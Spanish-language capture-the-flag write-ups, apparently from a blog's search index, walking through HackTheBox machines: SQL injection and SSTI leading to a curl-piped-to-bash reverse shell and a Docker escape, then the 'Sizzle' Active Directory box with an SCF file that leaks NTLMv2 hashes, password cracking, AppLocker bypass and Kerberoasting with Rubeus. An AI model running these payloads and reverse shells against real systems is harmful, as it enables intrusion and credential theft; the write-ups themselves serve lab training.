Forcing: Probando en el resultado 4 con el caracter 4 en la posicion 2[o] Output: email id name passwordVamos a sacar el contenido de la columna “name” y “password” ya que son los datos que nos piden en el login.python3 sqli.py -p \"select concat(name,':',password) from main.user\" -l -r 45 -i 5[......\\.] Brute Forcing: Probando en el resultado 0 con el caracter l en la posicion 43[......\\.] Output: admin:2b22337f218b2d82dfc3b6f77e7cb8ecParece ser que la contraseña esté hasheada, vamos a ver que algoritmo de encriptación fue utilizado para poder desencriptarlo. Yo voy a utilizar hash identifier.Vemos el tipo de algoritmo utilizadoSe utilizó “MD5” para hashear la contraseña, es bastante fácil romper este hash, yo voy a utilizar crackstation para hacerlo.Crackeamos el hashVamos a usar esta contraseña con el usuario encontrado anteriormente para autenticarnos contra el panel de login, quedarían así las credenciales “admin:superadministrator”.Nos logueamos en el panel de flaskSi vemos el panel de login veíamos la palabra “flask” en grande, además, si veis las tecnologías utilizadas en la página veréis que se está utilizando “flask”, esto nos puede indicar que puede ir encaminado en un SSTI (Server Side Template Injection).Vamos a probar el siguiente payload “{{7*7}}” en todos los lados para ver si encontramos el SSTI.Descubrimos un SSTIHemos descubierto un SSTI en el apartado de nombre en nuestro usuario, vamos a ver si podemos ejecutar comandos, voy a usar el siguiente payload “{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘id’).read() }}”.Conseguimos ejecutar comandosVamos a mandarnos una reverse shell, yo voy a utilizar curl para hacerlo. Nos crearemos un archivo “index.html” que contenga una reverse shell, luego desde la máquina víctima apuntaremos a esta url y lo ejecutaremos con bash.Este será el archivo “index.html”:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.9/443 0&gt;&amp;1Vamos a crearnos un servidor web que aloje el archivo “index.html” y vamos a ponernos en escucha en el puerto 443.❯ python3 -m http.server 80❯ nc -nlvp 443listening on [any] 443 ...Ahora vamos a mandarnos la petición desde la máquina víctima, utilizaremos el siguiente payload: “{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘curl http://10.10.14.9 | bash’).read() }}”Nos debería haber llegado una reverse shell, vamos a tratar la tty para hacerla completamente funcional.&gt; script /dev/null -c bashScript started, file is /dev/null&gt; CTRL + Zsuspended nc -nlvp 443❯ stty raw -echo; fgnc -nlvp 443\tresetreset: unknow terminal type unknownTerminal type? xterm&gt; export SHELL=bash&gt; export TERM=xterm&gt; stty rows 41 columns 184Post-explotaciónLo primero, vamos a intentar ver la flag del usuario.&gt; cd /home&gt; ls augustuscd augustus; cat user.txt25cbadd89133afc4****************Vemos que hemos entrado directamente como el usuario “root”, vamos a comprobar si estamos en un contenedor comprobando la dirección IP.&gt; hostname -I172.19.0.2Vemos que estamos en un contenedor, la mayoría de veces docker nos genera una interfaz intermediaria para conectarnos con nuestro host, esto lo podemos mirar con:&gt; route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 172.19.0.1 0.0.0.0 UG 0 0 0 eth0172.19.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth0Vemos que existe una, vamos a ver si tenemos conexión con ella.&gt; ping -c 1 172.19.0.1PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data.64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.062 ms--- 172.19.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.062/0.062/0.062/0.000 msSi nos fijamos e intentamos buscar el usuario “augustus” en el “/etc/passwd” veremos que no existe una entrada para este usuario, sin embargo, tenemos su home y si además vemos los permisos de su home veremos que apunta a un grupo que no existe, por lo que podemos deducir que el home del usuario está montad en nuestro contenedor. Vamos a comprobar esto.&gt; ls -ltotal 4-rw-r----- 1 root 1000 33 Sep 7 16:04 user.txt&gt; cat /etc/group | grep 1000&gt; mount | grep augustus/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)Podemos intentar ver que puertos están abiertos en la interfaz que hemos encontrado (172.19.0.1), vamos a crear un script para enumerar los puertos.&gt; nano portscan.shbash: nano: command not foundVemos que no vamos a poder utilizar nano,vim… Vamos a crearnoslo en nuestra máquina y luego lo pasaremos a la máquina víctima.#!/bin/bashfunction ctrl_c(){ echo \"[!] Saliendo...\" exit 1}trap ctrl_c INTfor i in $(seq 1 65535); do timeout 1 bash -c \"echo '' &gt; /dev/tcp/172.19.0.1/$i\" 2&gt;/dev/null &amp;&amp; echo \"[*] Puerto Abierto: $i\" &amp;doneVamos a pasarlo a la máquina víctima para luego ejecutarlo.❯ cat portscan.py | base64 -w 0IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogICAgZWNobyAiWyFdIFNhbGllbmRvLi4uIgogICAgZXhpdCAxCn0KCnRyYXAgY3RybF9jIElOVAoKZm9yIGkgaW4gJChzZXEgMSA2NTUzNSk7IGRvCiAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLzE3Mi4xOS4wLjEvJGkiIDI+L2Rldi9udWxsICYmIGVjaG8gIlsqXSBQdWVydG8gQWJpZXJ0bzogJGkiICYKZG9uZQo=&gt; echo 'IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogICAgZWNobyAiWyFdIFNhbGllbmRvLi4uIgogICAgZXhpdCAxCn0KCnRyYXAgY3RybF9jIElOVAoKZm9yIGkgaW4gJChzZXEgMSA2NTUzNSk7IGRvCiAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLzE3Mi4xOS4wLjEvJGkiIDI+L2Rldi9udWxsICYmIGVjaG8gIlsqXSBQdWVydG8gQWJpZXJ0bzogJGkiICYKZG9uZQo=' | base64 -d &gt; portscan.shVamos a asignarle privilegios de ejecución al script y ejecutarlo.&gt; chmod +x portscan.sh&gt; ./portscan.sh[*] Puerto Abierto: 22[*] Puerto Abierto: 80Vemos que está abierto el puerto 22 y 80, vamos a intentar conectarnos por ssh con el usuario “augustus” con la contraseña que habíamos encontrado antes (superadministrator).&gt; ssh augustus@172.19.0.1augustus@172.19.0.1's password: superadministrator&gt; whoamiaugustusComo tenemos montado el home del usuario “augustus” en el docker y tenemos el usurio “root” podríamos traernos un binario con permisos SUID al home del usuario para poder escalar al usuario en el host.&gt; cp /bin/bash /home/augustus/ (docker)&gt; chmod 4777 bash (docker)&gt; chown root:root bash (docker)&gt; ./bash -p (ssh)Ahora que hemos conseguido convertirnos en “root” en la máquina víctima, vamos a leer la flag del usuario root.&gt; cat /root/root.txt8ghb158cf1469754f****************" }, { "title": "Sizzle Writeup", "url": "/posts/writeup-sizzle/", "categories": "Writeup, HTB", "tags": "Windows, CTF, Insane, Directorio Activo, SMB, Kerberoasting, DCSync, SFC, Interacción Usuario, Crackeo Contraseñas", "date": "2022-08-29 00:00:00 +0200", "snippet": "Máquina Insane, en la que nos aprovechamos de una interacción con el usuario para obtener su hash, luego conseguimos el hash de otro usuario a través de rubeus, por último nos aprovechamos de DCSync para sacar los hashes de todos los usuarios.ReconocimientoPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.10.103PING 10.10.10.103 (10.10.10.103) 56(84) bytes of data.64 bytes from 10.10.10.103: icmp_seq=1 ttl=127 time=36.3 ms--- 10.10.10.103 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 36.293/36.293/36.293/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es Windows.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios están asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.103 -oG allPorts -p- -&gt; Escanea todos los puertos (65535) –open -&gt; Muestra solo los puertos con un estatus “open” -sS -&gt; Aplica un TCP SYN Scan –min-rate 5000 -&gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv -&gt; Muestra la información en pantalla a medida que se descubre -n -&gt; Indica que no aplique resolución DNS -Pn -&gt; Indica que no aplique el protocolo ARP 10.10.10.103 -&gt; Dirección IP que se quiere escanear -oG allPorts -&gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 08:27 CESTScanning 10.10.10.103 [65535 ports]PORT STATE SERVICE REASON21/tcp open ftp syn-ack ttl 12753/tcp open domain syn-ack ttl 12780/tcp open http syn-ack ttl 127135/tcp open msrpc syn-ack ttl 127139/tcp open netbios-ssn syn-ack ttl 127389/tcp open ldap syn-ack ttl 127443/tcp open https syn-ack ttl 127445/tcp open microsoft-ds syn-ack ttl 127464/tcp open kpasswd5 syn-ack ttl 127593/tcp open http-rpc-epmap syn-ack ttl 127636/tcp open ldapssl syn-ack ttl 1273268/tcp open globalcatLDAP syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1275985/tcp open wsman syn-ack ttl 1275986/tcp open wsmans syn-ack ttl 1279389/tcp open adws syn-ack ttl 12747001/tcp open winrm syn-ack ttl 127 ---SKIP---Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49667,49669,49677,49688,49689,49691,49694,49706,49711,49719 -sC -sV 10.10.10.161 -oN targeted -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49667,49669,49677,49688,49689,49691,49694,49706,49711,49719 -&gt; Indica los puertos que se quieren escanear -sC -&gt; Lanza scripts básicos de enumeración -sV -&gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.10.103 -&gt; Dirección IP que se quiere escanear -oN targeted -&gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 08:32 CESTNmap scan report for HTB.LOCAL (10.10.10.103)PORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-syst: |_ SYST: Windows_NT|_ftp-anon: Anonymous FTP login allowed (FTP code 230)53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: Site doesn't have a title (text/html).|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)|_ssl-date: 2022-08-29T06:34:07+00:00; +8s from scanner time.| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL| Not valid before: 2022-08-29T04:35:53|_Not valid after: 2023-08-29T04:35:53443/tcp open ssl/http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| tls-alpn: | h2|_ http/1.1|_ssl-date: 2022-08-29T06:34:07+00:00; +8s from scanner time.|_http-title: Site doesn't have a title (text/html).| http-methods: |_ Potentially risky methods: TRACE| ssl-cert: Subject: commonName=sizzle.htb.local| Not valid before: 2018-07-03T17:58:55|_Not valid after: 2020-07-02T17:58:55445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 ---SKIP---Los puertos abiertos y sus servicios asocidados son: 21/tcp -&gt; ftp 53/tcp -&gt; dns 80/tcp -&gt; http 135/tcp -&gt; rpc 139/tcp -&gt; rpc 389/tcp -&gt; ldap 443/tcp -&gt; https 445/tcp -&gt; smb 464/tcp -&gt; kpasswd 593/tcp -&gt; ncacn_http 636/tcp -&gt; ssl/ldap 3268/tcp -&gt; ldap 3269/tcp -&gt; ssl/ldap 5985/tcp -&gt; http 5986/tcp -&gt; ssl/http 9389/tcp -&gt; mc-nmf 47001/tcp -&gt; httpFTPVemos que el FTP permite el login anónimo, vamos a ver que contiene.❯ ftp 10.10.10.103Connected to 10.10.10.103.220 Microsoft FTP ServiceName (10.10.10.103:xdann1): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls -a200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.ftp&gt; put test.txtlocal: test.txt remote: targeted200 PORT command successful.550 Access is denied.No existe ningún archivo, además, no tenemos permisos para subir archivos.WebVemos que está abierto un servidor web, vamos a ver las tecnologías que utiliza la página.❯ whatweb http://10.10.10.103http://10.10.10.103 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.103], Microsoft-IIS[10.0], X-Powered-By[ASP.NET]Tiene todas las tecnologías actualizadas, vamos a realizar un pequeño fuzzing con dirsearch.❯ dirsearch -u http://10.10.10.103Target: http://10.10.10.103/[14:47:20] Starting: [14:47:20] 403 - 312B - /%2e%2e//google.com[14:47:25] 403 - 2KB - /Trace.axd[14:47:26] 403 - 312B - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd[14:47:31] 403 - 1KB - /aspnet_client/[14:47:31] 301 - 157B - /aspnet_client -&gt; http://10.10.10.103/aspnet_client/[14:47:32] 403 - 1KB - /certenroll/[14:47:32] 401 - 1KB - /certsrv/[14:47:36] 301 - 150B - /images -&gt; http://10.10.10.103/images/[14:47:36] 403 - 1KB - /images/[14:47:36] 200 - 60B - /index.htmlEn la ruta “certsrv” encontramos un panel de login, nos lo apuntamos que luego nos puede ser útil.SMBVamos a ver que nos encontramos en el puerto 445 (SMB), haremos uso de un “Null Session” junto con herramientas para enumerar este puerto. Entre ellas, crackmapexec, smbclient y smbmap.❯ crackmapexec smb 10.10.10.103SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)❯ smbmap -H 10.10.10.103 -u \"test\"[+] Guest session \tIP: 10.10.10.103:445\tName: HTB.LOCAL \tDisk \tPermissions\tComment\t---- \t-----------\t-------\tADMIN$ \tNO ACCESS\tRemote Admin\tC$ \tNO ACCESS\tDefault share\tCertEnroll \tNO ACCESS\tActive Directory Certificate Services share\tDepartment Shares \tREAD ONLY\t\tIPC$ \tREAD ONLY\tRemote IPC\tNETLOGON \tNO ACCESS\tLogon server share \tOperations \tNO ACCESS\t\tSYSVOL \tNO ACCESS\tLogon server share Tenemos acceso de lectura a los recursos compartidos “Department Shares” y “IPC$”, vamos a montarnos ambos recursos en nuestra máquina para verlos de una forma más comoda, además, tenemos un dominio, vamos a apuntarnoslo en el /etc/hosts.❯ mount -t cifs -o username=xdann1,password= '//10.10.10.103/Department Shares' /mnt/sharesSi entramos a “/mnt/shares/” veremos que existen una gran cantidad de carpetas, vamos a verlo mejor con tree -fas.❯ tree -fas.├── [ 0] ./Accounting├── [ 0] ./Audit├── [ 0] ./Banking│   └── [ 0] ./Banking/Offshore│   ├── [ 0] ./Banking/Offshore/Clients│   ├── [ 0] ./Banking/Offshore/Data│   ├── [ 0] ./Banking/Offshore/Dev│   ├── [ 0] ./Banking/Offshore/Plans│   └── [ 0] ./Banking/Offshore/Sites├── [ 0] ./CEO_protected├── [ 0] ./Devops├── [ 0] ./Finance├── [ 0] ./HR│   ├── [ 0] ./HR/Benefits│   ├── [ 0] ./HR/Corporate Events│   ├── [ 0] ./HR/New Hire Documents│   ├── [ 0] ./HR/Payroll│   └── [ 0] ./HR/Policies├── [ 0] ./Infosec├── [ 0] ./Infrastructure├── [ 0] ./IT├── [ 0] ./Legal├── [ 0] ./M&amp;A├── [ 0] ./Marketing├── [ 0] ./R&amp;D├── [ 0] ./Sales├── [ 0] ./Security├── [ 0] ./Tax│   ├── [ 0] ./Tax/2010│   ├── [ 0] ./Tax/2011│   ├── [ 0] ./Tax/2012│   ├── [ 0] ./Tax/2013│   ├── [ 0] ./Tax/2014│   ├── [ 0] ./Tax/2015│   ├── [ 0] ./Tax/2016│   ├── [ 0] ./Tax/2017│   └── [ 0] ./Tax/2018├── [ 0] ./Users│   ├── [ 0] ./Users/amanda│   ├── [ 0] ./Users/amanda_adm│   ├── [ 0] ./Users/bill│   ├── [ 0] ./Users/bob│   ├── [ 0] ./Users/chris│   ├── [ 0] ./Users/henry│   ├── [ 0] ./Users/joe│   ├── [ 0] ./Users/jose│   ├── [ 0] ./Users/lkys37en│   ├── [ 0] ./Users/morgan│   ├── [ 0] ./Users/mrb3n│   └── [ 0] ./Users/Public└── [ 0] ./ZZ_ARCHIVE ---SKIP---AS-REP RoastVemos una carpeta que contiene lo que parecen ser usuarios, vamos a apuntarnoslos para probar un AS-REP Roasting.❯ impacket-GetNPUsers HTB.LOCAL/ -no-pass -usersfile usersImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[-] [Errno Connection error (HTB.LOCAL:88)] [Errno 113] No route to host[-] [Errno Connection error (HTB.LOCAL:88)] [Errno 113] No route to host[-] [Errno Connection error (HTB.LOCAL:88)] [Errno 113] No route to host ---SKIP---No nos funciona el AS-REP Roast.SCF File AttackVamos a ver los permisos que tenemos sobre las carpetas para ver si tenemos algún privilegio de escritura en alguna carpeta.❯ for dir in $(ls /mnt/shares); do for subdir in $(ls /mnt/shares/$dir); do smbcacls \"//10.10.10.103/Department Shares\" \"$dir/$subdir\" -N | grep -i everyone | grep -i full &gt; /dev/null &amp;&amp; echo \"[*] Directorio $dir/$subdir: Permisos de escritura\"; done; doneVeremos que tenemos acceso completo en el directorio “Users/Public” y en el directorio “ZZ_ARCHIVE”[*] Directorio Users/Public: Permisos de escritura[*] Directorio ZZ_ARCHIVE/AddComplete.pptx: Permisos de escritura[*] Directorio ZZ_ARCHIVE/AddMerge.ram: Permisos de escritura[*] Directorio ZZ_ARCHIVE/ConfirmUnprotect.doc: Permisos de escritura[*] Directorio ZZ_ARCHIVE/ConvertFromInvoke.mov: Permisos de escritura[*] Directorio ZZ_ARCHIVE/ConvertJoin.docx: Permisos de escritura[*] Directorio ZZ_ARCHIVE/CopyPublish.ogg: Permisos de escritura ---SKIP---Vamos a subir archivos en estas dos rutas para ver si existe algún modo de interacción con un usuario.&gt; put test.txt (en Users/Public)❯ watch -n 5 ls /mnt/shares/Users/Public&gt; put test.txt (en ZZ_ARCHIVE)❯ watch -n 5 ls /mnt/shares/ZZ_ARCHIVEAl tiempo vemos que el archivo que subimos en “Users/Public” es eliminado, por lo que podemos suponer que existe una interacción con un usuario. Podríamos intentar subir un archivo que intente cargar un fichero en un servidor que nos hemos creado anteriormente, de tal forma que consigamos el hash NTLMv2 del usuario. En la siguiente página podeis encontrar más información acerca de este ataque.Vamos a crear el archivo que va a hacer que el usuario interactue con nuestro servidor de tal forma que consigamos el hash NTLMv2.[Shell]Command=2IconFile=\\\\10.10.14.21\\smbFolder\\users[Taskbar]Command=ToggleDesktopYa con el archivo creado, lo vamos a subir a “Users/Public”, al momento nos crearemos un servidor utilizando smbserver, esperaremos unos minutos hasta conseguir el hash NTLMv2 del usuario.❯ impacket-smbserver smbFolder $(pwd) -smb2supportEste sería el hash del usuario “amanda”.amanda::HTB:aaaaaaaaaaaaaaaa:c424ebae358ef3c9f993d2bb665019d4:0101000000000000806203b39ebbd8013dd2da32f0e578f200000000010010006d004c00570049007800550042005300030010006d004c005700490078005500420053000200100064007100520072006400660059005200040010006400710052007200640066005900520007000800806203b39ebbd801060004000200000008003000300000000000000001000000002000007c220dc2b1dbb0d8649575e244e9a3d56815d306332defe978a80873758ae1f70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000Vamos a intentar crackear el hash del usuario “amanda” con john.❯ john --w=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusAshare1972 (amanda)1g 0:00:00:07 DONE (2022-08-29 14:22) 0.1362g/s 1555Kp/s 1555Kc/s 1555KC/s Ashiah08..Ariel!Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completedYa tenemos la contraseña del usuario “amanda”, las credenciales quedarían así “amanda:Ashare1972”. Vamos a probar si las credenciales son válidas en smb y evil-winrm.❯ crackmapexec smb 10.10.10.103 -u amanda -p 'Ashare1972'SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\amanda:Ashare1972 ❯ crackmapexec winrm 10.10.10.103 -u amanda -p 'Ashare1972'SMB 10.10.10.103 5986 SIZZLE [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)HTTP 10.10.10.103 5986 SIZZLE [*] https://10.10.10.103:5986/wsmanWINRM 10.10.10.103 5986 SIZZLE [-] HTB.LOCAL\\amanda:Ashare1972 \"The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''\"RPCAhora que tenemos unas credenciales podemos probar a sacar datos del rpc, voy a utilizar el siguiente repositorio para ello.❯ ./logRPCenum -e All -i 10.10.10.103 -u 'amanda' -p 'Ashare1972' &gt; allNo tenemos nada interesante aparte de más usuarios.CertificadosLas credenciales son válidas para smb, vamos a ver si tenemos acceso a algún recurso compartido que no teníamos acceso antes.❯ smbmap -H 10.10.10.103 -u \"amanda\" -p \"Ashare1972\"[+] IP: 10.10.10.103:445\tName: HTB.LOCAL \tDisk \tPermissions\tComment\t---- \t-----------\t-------\tADMIN$ \tNO ACCESS\tRemote Admin\tC$ \tNO ACCESS\tDefault share\tCertEnroll \tREAD ONLY\tActive Directory Certificate Services share\tDepartment Shares \tREAD ONLY\t\tIPC$ \tREAD ONLY\tRemote IPC\tNETLOGON \tREAD ONLY\tLogon server share \tOperations \tNO ACCESS\t\tSYSVOL \tREAD ONLY\tLogon server share Vemos que tenemos acceso al recurso compartido “CertEnroll”, tiene un nombre parecido a la ruta del login que encontramos anteriormente, por lo que suponemos que si tenemos acceso al recurso compartido tendremos acceso al login, vamos a intentar autenticarnos con estas credendeciales contra el panel de login.Login AmandaLas credenciales son válidas y nos conseguimos autenticar, la página es de “Microsoft Active Directory Certificate Services”, en ella podemos generar certificados que podremos usar posteriormente para demostar que realmente somos la persona que decimos ser.Nosotros para autenticarnos en evil-winrm utilizando certificados necesitamos 2 archivos, un archivo “*.key” y un archivo “*.cer”, el archivo “*.key” lo podemos generar localmente, sin embargo, para generar el archivo “*.cer” necesitaremos introducir en la página un archivo “*.csr”, este último archivo lo podemos generar desde el archivo “*.key”. Vamos a generar todos los certificados para poder conectarnos por evil-winrm.❯ openssl req -newkey rsa:2048 -nodes -keyout filename.key -out filename.csrYa con el archivo “*.csr” podemos generar el archivo “*.cer” en la página web. Tendremos que acceder “Request a certificate &gt; advanced certificate request”, tendremos que copiar el contenido del archivo “filename.csr” en la web.Creamos el certificadoUna vez que le hayamos pasado el archivo “*.cer” nos darán algunas opciones para descargar el certificado, vamos a elegir “Base 64 encoded” y luego le daremos a “Download Certificate”.Descargamos el certificadoUna vez que tengamos descargado el certificado simplemente le tendremos que pasar ambos certificados a evil-winrm y nos podremos conectar.❯ evil-winrm -S -c certnew.cer -k filename.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'Shell como amandaVamos a realizar un reconocimiento básico sobre la máquina víctima&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled&gt; net user amandaUser name amandaFull NameCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 7/10/2018 4:42:11 PMPassword expires NeverPassword changeable 7/11/2018 4:42:11 PMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 8/29/2022 10:32:11 AMLogon hours allowed AllLocal Group Memberships *Remote Management Use*UsersGlobal Group memberships *Domain UsersThe command completed successfully.No tenemos ningún usuario o privilegio asignado fuera de lo normal. Vamos a ver si la máquina tiene abierto algún puerto que no se pueda ver desde el exterior.&gt; netstat -ap tcp &gt; netstat.txt&gt; download netstat.txt❯ cat netstat.txt | awk '{print $2}' | grep \"0.0.0.0\" | tr \":\" \" \" | awk '{print $2}' &gt; internal_portsEntre todos los puertos que tiene abiertos internamente la máquina víctima vemos algunos que no lo están para los demás, entre ellos el puerto 88 (Kerberos).BloodhoundVamos a abrirnos bloodhound para enumerar usuarios kerberoasteables y otra información. Antes de nada, tendremos que conseguir el comprimido con el cual vamos a operar desde bloodhound. Esto lo haremos con el propio ingestor que trae bloodhound, en este caso vamos a utilizar la version en python.❯ bloodhound-python -u 'amanda' -p 'Ashare1972' -ns 10.10.10.103 -d HTB.LOCAL -c All --zipYa con el zip en nuestra máquina, nos abriremos bloodhound y neo4j para poder ver la información que acabamos de conseguir (si nunca habeis utilizado neo4j antes os pedirán que cambieis la contraseña, las credenciales por defecto para acceder son “neo4j:neo4j”).❯ neo4j console❯ bloodhound &amp;&gt;/dev/null disownCuando ya tengamos totalmente abierto bloodhound tendremos que subir los datos, esto lo haremos desde el siguiente botón.Subimos los datosCuando ya tengamos todos los datos subidos en bloodhound filtraremos por “List all Kerberoastable Accounts” para ver que usuarios podemos conseguir su ticket TGS (Ticket Granting Service).Buscamos usuarios kerberoasteablesYa tenemos un usuario vulnerable a un kerberoasting attack, sin embargo, como hemos visto antes no tenemos acceso directo al puerto de kerberos (88), por lo que tendremos que traernoslo a nuestra máquina utilizando un port forwarding o podemos utilizar rubeus para hacerlo desde la propia máquina, yo utilizaré rubeus. Igualmente, sigamos viendo en bloodhound que podemos hacer con el usuario “mrlky”, filtraremos por “Find Principals with DCSync Rights”Buscamos usuarios con privilegios de DCSyncVemos que el usuario “mrlky” puede realizar un DCSync attack.RubeusEl esquema de ataque sería el siguiente: Descargamos rubeus en la máquina víctima. Conseguimos el ticket TGS del usuario “mrlky” con un kerberoasting attack Crackeamos el hash Abusamos del privilegio DCSyncVamos a descargar rubeus en la máquina victima para poder utilizarlo, lo podéis descargar desde la siguiente url. Nos vamos a compartir un servidor web desde el que nos descargaremos rubeus en la máquina víctima.❯ python3 -m http.server 80&gt; iwr -uri http://10.10.14.21/Rubeus.exe -outfile Rubeus.exe&gt; ./Rubeus.exeSi intentamos ejecutar Rubeus.exe veremos que nos da un error debido a que el programa está bloqueado debido a “políticas de grupos”, vamos a ver si tenemos algún directorio en el que nos podamos saltar esta restricción.&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollectionsPublisherConditions : {*\\*\\*,0.0.0.0-*}PublisherExceptions : {}PathExceptions : {}HashExceptions : {}Id : a9e18c21-ff8f-43cf-b9fc-db40eed693baName : (Default Rule) All signed packaged appsDescription : Allows members of the Everyone group to run packaged apps that are signed.UserOrGroupSid : S-1-1-0Action : AllowPathConditions : {\\%WINDIR%\\*}PathExceptions : {}PublisherExceptions : {}HashExceptions : {}Id : a61c8b2c-a319-4cd0-9690-d2177cad7b51Name : (Default Rule) All files located in the Windows folderDescription : Allows members of the Everyone group to run applications that are located in the Windows folder.UserOrGroupSid : S-1-1-0Action : Allow ---SKIP---Todos los ficheros que han sido creados debajo de la carpeta “Windows” deberían ser permitidos para ejecutarse, vamos a crearnos una carpeta en la que nos descargaremos rubeus.&gt; mkdir C:\\Windows\\temp\\rubeus&gt; cd C:\\Windows\\temp\\rubeus&gt; iwr -uri http://10.10.14.21/Rubeus.exe -outfile Rubeus.exe&gt; ./Rubeus.exeComprobamos que ya podemos ejecutar rubeus, ahora vamos a sacar el ticket TGS del usuario “mrlky”.&gt; ./Rubeus.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare1972 El hash del usuario “mrlky” sería el siguiente:$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d5